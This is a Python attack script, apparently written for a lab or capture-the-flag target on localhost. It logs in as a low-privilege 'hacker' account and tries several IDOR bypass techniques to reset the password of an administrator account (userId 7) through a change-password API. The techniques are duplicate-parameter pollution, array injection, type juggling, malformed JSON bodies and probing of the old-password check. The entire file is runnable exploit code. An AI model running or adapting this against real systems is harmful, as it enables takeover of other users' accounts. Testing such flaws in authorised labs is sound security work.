import requests
import json
import urllib.parse

base_url = "http://127.0.0.1:32973"

# Step 1: Login to get a valid session
print("=" * 60)
print("STEP 1: Logging in as attacker (hacker/hacker123!)")
print("=" * 60)

login_data = {
    "username": "hacker",
    "password": "hacker123!"
}

session = requests.Session()
login_resp = session.post(f"{base_url}/api/login.php", data=login_data)
print(f"Login Status: {login_resp.status_code}")
print(f"Login Response: {login_resp.text}")
print(f"PHPSESSID: {session.cookies.get('PHPSESSID')}")

if login_resp.status_code != 200:
    print("[ERROR] Login failed!")
    exit()

print("\n" + "=" * 60)
print("STEP 2: Testing IDOR Bypass Techniques")
print("=" * 60)

# Technique 1: Parameter pollution - duplicate userId parameters
print("\n[TECHNIQUE 1] Parameter Pollution - userId=7 then userId=17")
print("-" * 60)

# Create a custom payload with duplicate parameters
pollution_body = "userId=7&oldPassword=hacker123!&newPassword=Hacked123!&confirmPassword=Hacked123!&userId=17"

headers_pollution = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": f"PHPSESSID={session.cookies.get('PHPSESSID')}"
}

pollution_resp = session.post(
    f"{base_url}/api/change_password.php",
    data=pollution_body,
    headers=headers_pollution
)
print(f"Request Body: {pollution_body}")
print(f"Status: {pollution_resp.status_code}")
print(f"Response: {pollution_resp.text}")

# Technique 1b: Reverse order - attacker first, then admin
print("\n[TECHNIQUE 1b] Parameter Pollution - userId=17 then userId=7 (reverse)")
print("-" * 60)

pollution_body2 = "userId=17&oldPassword=hacker123!&newPassword=Hacked123!&confirmPassword=Hacked123!&userId=7"

pollution_resp2 = session.post(
    f"{base_url}/api/change_password.php",
    data=pollution_body2,
    headers=headers_pollution
)
print(f"Request Body: {pollution_body2}")
print(f"Status: {pollution_resp2.status_code}")
print(f"Response: {pollution_resp2.text}")

# Technique 2: Array injection on userId
print("\n[TECHNIQUE 2] Array Injection - userId[]=7&userId[]=17")
print("-" * 60)

array_body = {
    "userId[]": "7",
    "oldPassword": "hacker123!",
    "newPassword": "Hacked123!",
    "confirmPassword": "Hacked123!"
}

array_resp = session.post(
    f"{base_url}/api/change_password.php",
    data=array_body
)
print(f"Request Body: {array_body}")
print(f"Status: {array_resp.status_code}")
print(f"Response: {array_resp.text}")

# Technique 3: Type juggling - String vs Integer
print("\n[TECHNIQUE 3] Type Juggling - userId as string '7' vs integer 7")
print("-" * 60)

# First with string
type_body1 = {
    "userId": "7",  # String
    "oldPassword": "hacker123!",
    "newPassword": "Hacked123!",
    "confirmPassword": "Hacked123!"
}

type_resp1 = session.post(
    f"{base_url}/api/change_password.php",
    data=type_body1
)
print(f"Request Body (string userId): {type_body1}")
print(f"Status: {type_resp1.status_code}")
print(f"Response: {type_resp1.text}")

# Technique 4: JSON content type with manipulated structure
print("\n[TECHNIQUE 4] JSON Content-Type with manipulated structure")
print("-" * 60)

# Various JSON payloads to test
json_payloads = [
    {"userId": 7, "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": "7", "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": [7, 17], "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": {"id": 7}, "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
]

for i, payload in enumerate(json_payloads, 1):
    json_headers = {
        "Content-Type": "application/json"
    }
    json_resp = session.post(
        f"{base_url}/api/change_password.php",
        json=payload,
        headers=json_headers
    )
    print(f"\n[JSON Variant {i}]")
    print(f"Payload: {json.dumps(payload)}")
    print(f"Status: {json_resp.status_code}")
    print(f"Response: {json_resp.text}")

# Technique 5: Test if oldPassword is user-specific or global
print("\n[TECHNIQUE 5] Testing oldPassword validation scope")
print("-" * 60)

# Test with wrong password but targeting admin
test_body1 = {
    "userId": 7,
    "oldPassword": "wrongpassword",
    "newPassword": "Hacked123!",
    "confirmPassword": "Hacked123!"
}

test_resp1 = session.post(
    f"{base_url}/api/change_password.php",
    data=test_body1
)
print(f"[Test 5a] Wrong oldPassword targeting admin userId=7")
print(f"Request Body: {test_body1}")
print(f"Status: {test_resp1.status_code}")
print(f"Response: {test_resp1.text}")

# Test with attacker's valid password targeting admin
test_body2 = {
    "userId": 7,
    "oldPassword": "hacker123!",
    "newPassword": "Hacked123!",
    "confirmPassword": "Hacked123!"
}

test_resp2 = session.post(
    f"{base_url}/api/change_password.php",
    data=test_body2
)
print(f"\n[Test 5b] Attacker's valid password targeting admin userId=7")
print(f"Request Body: {test_body2}")
print(f"Status: {test_resp2.status_code}")
print(f"Response: {test_resp2.text}")

# Test changing attacker's own password (baseline)
test_body3 = {
    "userId": 17,
    "oldPassword": "hacker123!",
    "newPassword": "Hacked123!",
    "confirmPassword": "Hacked123!"
}

test_resp3 = session.post(
    f"{base_url}/api/change_password.php",
    data=test_body3
)
print(f"\n[Test 5c] Attacker changing own password (baseline)")
print(f"Request Body: {test_body3}")
print(f"Status: {test_resp3.status_code}")
print(f"Response: {test_resp3.text}")

print("\n" + "=" * 60)
print("SUMMARY OF RESULTS")
print("=" * 60)
print(f"Parameter Pollution (admin first): {pollution_resp.text}")
print(f"Parameter Pollution (attacker first): {pollution_resp2.text}")
print(f"Array Injection: {array_resp.text}")
print(f"Type Juggling (string userId): {type_resp1.text}")
print(f"Wrong pwd on admin: {test_resp1.text}")
print(f"Attacker pwd on admin: {test_resp2.text}")
print(f"Own password change: {test_resp3.text}")

